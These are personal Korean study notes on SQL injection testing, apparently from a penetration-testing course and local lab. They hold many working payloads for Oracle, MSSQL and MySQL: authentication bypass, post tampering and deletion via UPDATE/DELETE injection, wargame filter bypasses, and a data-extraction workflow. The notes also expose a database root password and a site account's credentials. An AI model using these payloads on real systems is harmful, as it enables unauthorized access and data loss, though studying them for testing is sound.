------------------------------------취약점 점검 방법론---------------------------

1. APMSetup 설치
 1) APMSetup 설치 
 apmsetup 검색하여 다운로드
 
 2) Mysql password 변경 -> apmsetup
>select user();
>update mysql.user set password=password('gh1015') where user='root';
>flush privileges;

 3) php.ini 
C:\APM_Setup
php.ini 파일에서 magic_quotes-gpc=On -> Off로 변경 후 아파치 재부팅

C:\APM_Setup\Server\Apache\bin\ApacheMonitor.exe

2. ORACLE 설치 및 PHP 연동
 1) ORACLE 다운로드 및 설치 
검색 : oracle download express 

 2) ORACLE + PHP 연동 및 테스트 

---------------------------------------취약점 점검 방법론-------------------------------------
취약점 분석 : 에러 유/무 확인, 취약점 유/무 확인, 조건 구문 완성
 Step12) 에러 유/무 확인 - DBMS 에러 발생으로 DBMS 종류 파악
 숫자입력창
  select * from board where idx=192 //올바른 구문
  select * from board where idx=a X //올바르지 않은 구문
  
 문자 입력창
  select * from member where id='crehacktive' O //올바른 구문
  select * from member where id='crehack'tive' X //올바르지 않은 구문
  
 Step2-1) 취약점 유/무 확인 - 데이터 타입 : 문자형
  select * from member where id='crehacktive' //O
  select * from member where id='crehack'||'tive' //ORACLE
  select * from member where id='crehack'a'tive' //MSSQL
  select * from member where id='crehack'+'tive' //MYSQL(+ = %2B)
  
 Step2-2) 취약점 유/무 확인 - 데이터 타입 : 숫자형
  select * from board where idx=192 //O
  select * from board where idx=192-1 //점검 구문
  select * from board where idx=192+3 //점검 구문(192%2b3)
   
 Step2-2) 취약점 유/무 확인 - 테이블 (tbname, tb_name 등)
  select * from board_notice ORDER BY idx desc //사용자 입력 : board_notice
  select * from board_notice where 1=1 ORDER BY idx desc //사용자 입력 : where 1=1-- 데이터 조회 성공
  select * from board_notice where 2=1 ORDER BY idx desc //사용자 입력 : where 2=1 데이터 조회 실패 
  
  http://localhost.jsp?tbname=notice+where+1=1, 1=2
  
 Step2-3) 취약점 유/무 확인 - 컬럼(WHERE 절)
  select * from board_notice WHERE [title] like %% //[]는 사용자 입력, 데이터 조회 성공
  select * from board_notice WHERE [1] like %% //숫자, 데이터 조회 성공
  select * from board_notice WHERE [a] like %%//문자, 데이터 조회 실패 
 
  http://localhost.jsp?search_column=1, a
  
 Step2-4) 취약점 유/무 확인 - 컬럼(ORDER BY 절)  
  select * from board_notice ORDER BY [idx] desc //데이터 조회 성공, 사용자 입력 값 
  select * from board_notice ORDER BY [1] desc //데이터 조회 성공, 사용자 입력 값 : 1이상의 숫자 값
  select * from board_notice ORDER BY [a] desc //에러발생 : 데이터 조회 실패 
   
  http://localhost.jsp?sort_column=1 //select * from board_notice ORDER BY 1 desc
  http://localhost.jsp?sort_column=a //select * from board_notice ORDER BY a desc
   
 Step2-5) 취약점 유/무 확인 - 키워드(ORDER BY 절) 
  select * from board_notice ORDER BY idx [desc] //데이터 조회 성공, 사용자 입력 값 
  select * from board_notice ORDER BY idx[,1] //데이터 조회 성공, 사용자 입력 값 : 1이상의 숫자 값
  select * from board_notice ORDER BY idx [a] //에러발생 : 데이터 조회 실패
  
  http://website.co.kr/boardList.jsp?sort=,1 //select * from board_notice ORDER BY idx,1 -> sort파라미터에 [,1] 입력 
  http://website.co.kr/boardList.jsp?sort=a //select * from board_notice ORDER BY idx a -> 에러반환

SQL 인젝션 구문 종류 
 In-Line Query : select * from ask where idx=[192 and 1=1] and user_id='hacker'
 Terminating Query : select * from ask where [idx=192 and 1=1--] and user_id='hacker'
 Stack Query : select * from ask where idx=[192;delete from ask--] and user_id='hacker' //MSSQL 환경에서만 가능함
   
 Step3-1) 조건 구문 완성 - 데이터 타입 : 문자형 
  취약 우뮤 확인 후 조건 구문 완성해야됨
  In-line Query : select * from member where user_id='[hacker' and 1=1 and '1'='1]'
  Terminating Query : select * from member where user_id='[hacker' and 1=1--]'
   
  http://website.co.kr/mypage.jsp?id=[hacker' and 1=1 and '1'='1] // select * from member where id='hacker' and '1'='1'
  http://website.co.kr/mypage.jsp?id=[hacker' and 1=1--] //select * from member where id='hacker' and 1=1--'
 
 Step3-2) 조건 구문 완성 - 데이터 타입 : 숫자형
  In-line Query : select * from ask where idx=[192 and 1=1] and and user_id='hacker'
  Terminating Query : select * from ask where idx=[192 and 1=1--] and user_id='hacker'
  
  http://website.co.kr/boardView.jsp?idx=[192+and+1=1] // select * from board where idx=[192 and 1=1]
  http://website.co.kr/boardView.jsp?idx=[192+and+1=1--] // select * from board where idx=[192 and 1=1--]
   
  Terminating Query 사용이 되지 않고, In-line Query 사용시 논리 연산자 사용이 되지 않을 경우 -> 연결 연산자와 CASE WHEN 구문 
 
 Step3-3) 조건 구문 완성 - CASE WHEN 구문 활용(1)
  In-line Query
  select * from ask WHERE idx=[(case when 1=1 then 9 else 3 end)]//9데이터 조회 성공
  
  Select * FROM member WHERE user_id=["||(case when 1=1 then 'hacker' else 'test' end)||"] //'hacker' 데이터 조회 성공
  
 Step3-3) 조건 구문 완성 - CASE WHEN 구문 활용(2)
  Query
  SELECT * FROM board ORDER BY [case when 1=1 then 1 else 2 end)] desc
  
  SELECT * FROM board ORDER BY [(case when 1=1 then idx else title end)] desc
 
 
 ----------------------------실습 2-1 취약점 분석 실습-----------------------------
 2-2 검색기능에 대한 올바른 취약점 점검 방법, 2-3검색 기능의 컬럼 파라미터에 대한 올바른 취약점 점검 
 
취약점 점검

+(%2b), ||(%7c%7c), '(%27), "(%22), %(%25), #(%23)

1) 에러 유/무 확인
 *MYSQL 
 검색창 : te' 'st(참), te'a'st(거짓) 구문 삽입하여 참거짓 확인 
 
 *MSSQL 
 검색창 : ' 삽입 // 에러구문에 문자열 'order by idx desc'의 따옴표가 짝이 맞지 않습니다. 라고 뜨면 거의 인젝션됨
 검색창 : '+', te'+'st, t'+'4 //+는 공백
 
 *ORACLE
 검색 : ' ', '+', 'f'//에러
 검색 : '||',tes'||'t //정상출력
 테이블 : tbname=all_tables
 WHERE절 : tbname=ex_member%20where%201=1
           tbname=ex_member%20where%201=2
           
           
2) 취약점 유/무 확인
search_type=1=1+and+title&keyword=test //참
search_type=1=2+and+title&keyword=test //거짓
search_type=(case+when+1=1+then+'test'+else+'ha'+end)&keyword=test
search_type=(case+when+2=1+then+'test'+else+'ha'+end)&keyword=test

정상 SQL : select * from board where title like '%test%'
비정상 SQL : select * from board where 'test' like '%test%'

'te'%2b'st' => 

구문(1) : select * from board where 1=1 and title like '%test%' => TRUE
          select * from board where 1=2 and title like '%test%' => FALSE

구문(2) : select * from board where (case when 1=1 then 'test' else 'ha' end) like '%test%'
          select * from board where (case when 1=2 then 'test' else 'ha' end) like '%test%'

3) 조건 구문 완성
 
 
 *MYSQL 
 검색창 : te' 'st(참), te'a'st(거짓) 구문 삽입하여 참거짓 확인
 
 localhost/board/mysql/index.php?sort_column=(case when 1=1 then idx else title end)&sort=desc //참구문
 
 localhost/board/mysql/index.php?sort_column=(case when 1=2 then idx else title end)&sort=desc //거짓구문
 
 localhost/board/mysql/index.php?sort_column=idx&sort=asc //정상출력
 
 localhost/board/mysql/index.php?sort_column=idx&sort=,1 //asc,1 정상 출력 (asc가 생략됨)
 
 localhost/board/mysql/index.php?sort_column=&sort=(case when 1=1 then idx else title end) // order by값의 컬럼이 null이면 asc가 디폴트로 설정됨
                                                                                             , idx 값이 기본으로 세팅되는 어플리케이션도 있음
 *MSSQL
 
 검색창 : ' 삽입 // 에러구문에 문자열 'order by idx desc'의 따옴표가 짝이 맞지 않습니다. 라고 뜨면 거의 인젝션됨
 검색창 : '+', te'+'st, t'+'4 //+는 공백
 
 localhost/board/mssql/index.php?idx=6-1 //6-1, 7-2 되면 인젝션됨
 
 localhost/board/mssql/index.php?idx=5 and 1=1 //5 and 1=2
 
 localhost/board/mssql/index.php?idx=(case when 1=1 then 5 else 1 end)
 
 localhost/board/mssql/index.php?idx=(case when 1=1 then idx else title end)&sort=desc
 
 localhost/board/mssql/index.php?idx=(case when 1=1 then idx else title end)&sort=desc //message : nvarchar 값 'test2'를 데이터 형식 int로 변환하지 못함, mssql은 앞은 int, 뒤는 nvarchar형식인데 두개형식이 안맞으면 에러가 발생함
 

 *ORACLE
 
 검색 : ' ', '+', 'f'//에러
 검색 : '||',tes'||'t //정상출력
 
 localhost/board/oracle/view.php?idx=2||5 //참
 
 localhost/board/oracle/view.php?idx=2a5 //거짓
   
 localhost/board/oracle/view.php?idx=25 and 1=1, idx=25 and 1=2
 
 localhost/board/oracle/view.php?idx=(case when 1=1 then 25 else 26 end) //참
 
 localhost/board/oracle/view.php?idx=(case when 1=2 then 25 else 26 end) //거짓
 
 localhost/board/oracle/index.php?sort_column=(case when 1=1 then idx else title end)&sort=desc //자료형이 일치하지 않아 에러발생
 
  localhost/board/oracle/index.php?sort_column=(case when 1=1 then writer else 'a' end)&sort=desc // 문자열로 동일하게 자료형을 만들어서 일치시킴
  
 --------------------------------실습 2-4 Prepared Statement 환경에서의 테이블 파라미터 점검---------------------
?는 플레이스 홀더
id=guest%27, gue'||'st //이렇게 연결연산자가 안되는것은 안된다고 봐야함
 
http://127.0.0.1:8888/security/example.jsp?tbname=ex_member
 
테이블 : tbname=all_tables // all_tables는 오라클 테이블 조회명령어
WHERE절 : tbname=ex_member where 1=1 //1=1부분에 조건구문이 들어가면됨
          tbname=ex_member where 1=1-- //
          tbname=(select * from ex_member where 1=1)&id=guest
소스코드
...
String sql = "SELECT * FROM " + tbname + " WHERE id = ?";

http://127.0.0.1:8888/security/example.jsp?tbname=ex_member where 1=1-- WHERE&id=guest //id 파라미터가 없어지니까 에러발생
 
http://127.0.0.1:8888/security/example.jsp?tbname=ex_member where id=?--&id=guest //id 파라미터를 만들어줌
SELECT * FROM ex_member where id=?-- WHERE id = ? // 이렇게하면 되지않을까, id라는 파라미터와 컬럼명은 90%일치 유추해야됨
http://127.0.0.1:8888/security/example.jsp?tbname=ex_member where 1=1 and id=?--&id=guest//참구문을 추가해서 조건 구문 완성
   
@위처럼 컬럼을 유추해서 끼워넣는 방법비추, ?(플레이스홀더)를 무시하고 서브쿼리를 넣는 방법 강추
자바웹환경에서 이러한 경우가 확률이 높기때문에 테이블 파라미터에서 인젝션이 발생이 된다면 

<아래 두개 쿼리문은 동일함>
SELECT * FROM ex_member WHERE id=?
SELECT * FROM (select * from ex_member) WHERE id=?

URL에 입력
http://127.0.0.1:8888/security/example.jsp?tbname=(select%20*%20rom%20ex_member)&id=guest //서브쿼리를 활용해서 조건구문 완성까지 가능
http://127.0.0.1:8888/security/example.jsp?tbname=(select%20*%20from%20ex_member%20where%1=1)&id=guest


--------------------------------------------인증 우회 공격 기법--------------------------------------

 - 인증우회 공격이란 무엇인가?
로그인 ID/PW 페이지 인증 우회

예시 1) 
id=admin' or '1'='
$query="select * from member where id='admin' or ''='' and pw='{$pw}'";

MYSQL 주석 문자 : --, #
[공백]--[공백]

id=admin' -- //--앞뒤에 공백이있어야 됨(admin'+--+)

예시 2)
id=admin'# //#도 공백으로 인식됨
$query="select * from member where id='admin'#' and pw='{$pw}'"; //#뒤부터 주석처리됨

예시 3)
검색창 : ' or 1=1 or '1'='1
$query="select * from member where id='' or 1=1 or '1'='1' and pw='{$pw}'";

예시 4)
검색창 :' or 1=1#, ' or 1=1 -- 
$query="select * from member where id='' or 1=1 -- ' and pw='{$pw}'";

[의문점]
왜 admin으로 로그인이 될까? DB에 있는 첫번째 계정이 로그인됨

*****인증우회를 통한 게시글 무단 열람 

비번창 : ' or '1'='1
select * from tb_board where idx=6 and password='' or '1'='1'
select * from tb_board where idx=6 and password='' or idx=6--' //F or T = T

*****인증우회를 통한 게시글 무단 수정/삭제

 - 수정
1) UPDATE 구문의 WHERE 절에 password 삽입되어 검증
=>' or 1=1-- //이러면 대참사남 
=>' or idx=7 //O (올바른 구문)
update board set title=.., content=..., date=... WHERE idx=7 and password='' or 1=1--' //이러면 장애남
update board set title=.., content=..., date=... WHERE idx=7 and password='' or idx=7--' //이렇게 해주면됨

2) UPDATE 구문 실행 전 password 검증 
=>' or 1=1-- //X (옳지 않은 구문)
=>' or idx=7-- //O (올바른 구문)
select * from board where idx=7 and password=''
update board set title=.., content=..., date=... WHERE idx=7

 - 삭제
3) DELETE 구문의 WHERE 절에 password 삽입되어 검증
비번창 : ' or idx=7--' //O (올바른 구문)
update board set title=.., content=..., date=... WHERE idx=7 and password='' or idx=7--'
delete from board where idx=7 and password='' or idx=7--'

4) DELETE 구문 실행 전 password 검증 
비번창 : ' or idx=7-- //O (올바른 구문)
select * from board where idx=7 and password=''

update board set title=.., content=..., date=... WHERE idx=7
delete from board whree idx=7





--------------------------------Lord of SQL Injection 워게임 실습 사이트---------------------
   
계정 생성 : kanesbg / rlfl1015! / kanesbg@naver.com 

 - 인증우회 기법
 - 데이터 조회 기법

1. ?id=' or 1=1%23, ?id=' or 1=1--%20, ' or 1=1 or '2'='
   ?pw=' or '1'='1 //인라인방식, ?pw=' or 1=1%23//터미네이팅 방식, 
   
2. ?pw=') or 1=1%23, ') or id='admin'%23 //앞에 md5(' 있을경우
   
3. ?no=1 or id='admin' // ' " ` 필터링되있음
MySQL에서 '(싱글쿼터)를 우회하는 방법
hex나 char를 이용하면 됨

>select hex('admin')
616460696E

>select 0x616460696E; //admin
select id from prob_goblin where id='guest' and no=1 or id=0x61646D696E //오답, guest and 1 = 참이므로 뒤에 or를 진행하지 않고 1번이 출력됨
select id from prob_goblin where id='guest' and no=2 or id=0x61646D696E //정답, guest and 2 = 거짓이므로 뒤에 or문이 진행됨(id='admin')
   
--, #은 해당라인만 주석처리됨
/**/은 멀티라인 주석이되는데 붙이면 공백이됨

?pw='%0cor%0cid='admin'%23 //내가한 방법
?pw='or/**/id='admin //'(싱글쿼터)와 or 사이에 붙여도됨

mysql or과 and 우회법
or => ||
and => &&

?pw='|| id='admin 

인증 우회 기법은 기초이고 실무에서도 발생횟수가 적지만
데이터 조회 공격을 하기위해서는 반드시 쿼리문을 알아야만 데이터 조회공격을 할 수있음
   
   
------------------------------데이터 조회공격 상세 프로세스---------------------

Phase1 취약점 분석
 1) 에러 유/무 확인
 2) 취약점 유/무 확인
 3) 조건 구문 완성

Phase2 환경 분석
 1) DBMS 파악
 2) 공격 적합성 검토
 
Phase3 공격기법 선택
 1) Error-Based
 2) Blind-Based
 3) Union-Based
 4) Out-Of-Band
 
Phase4 공격 검증
 1) 공격 검증

Phase5 데이터 조회 공격
 1) 기본 정보 목록화 
 2) 메타 데이터 목록화
 3) 데이터 목록화
   
------------------------------환경 분석---------------------   
Step 1) DBMS 파악 - 에러, 연결연산자, 함수, 더미

DBMS별 차이점 
함수
데이터 사전
순차적 레코드 출력 

1. 에러를 통한 DBMS 파악 

2. 연결 연산자를 통한 DBMS 파악(강추)
Oracle, DB2, Tibero, CUBRID || //1||91 -> 192
MSSQL + // ?idx=192 and 'test'='te'+'st' => ?idx=192+and+'test'='te'%2b'st'
MySQL 공백 

3. 함수를 통한 DBMS 파악
Oracle - sysdate, substr(), length()
MSSQL - getdate(), substring(), len()
MYSQL - now(), mid(), length(), concat() 


4. 더미 테이블을 통한 DBMS 파악
Oracle
select 1 from dual 

DB2
select 1 from sysibm.sysdummy1 

ex) ?idx=192
    ?idx=(select 192 from dual) //Oracle 
	?idx=(select 192 from sysibm.sysdummy1 ) //DB2 
	?idx=test' and 1=(select 1 from dual)-- //' and 1=1--
	?idx=test' and 1=(select 1 from sysibm.sysdummy1)-- //DB2 

Step 2) 공격 적합성 검토 
DBMS 에러 출력 유/무 파악 - ERROR-BASED

DB 데이터 웹 페이지 출력 유/무 파악 -UNION-BASED
   
MYSQL   
?idx=7 and min('test',1,1)='t'
?idx=7 and 1=1
?idx=7 and 'test'='te' 'st'

MSSQL
검색 : tes' 't, te'+'st
?idx=5 and 'te'%2b'st'='test'
?idx=(select 5 from dual) //oracle인지 확인
?idx=5 and 'te'%2b'st'='test'
?idx=5 and length('test')=4 //거짓
?idx=5 and len('test')=4 //참

ORACLE
검색 : tes'||'t
검색 : t'||(case when 1=1 then 'e' else 'a' end)||'st //참이면 test검색, 거짓이면 tast
?idx=2||5 //25로 출력 

?idx=25 and 'test'='te'||'st'
?idx=(select 25 from dual)
?idx=(select 25 from dual)' //에러확인

   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
  
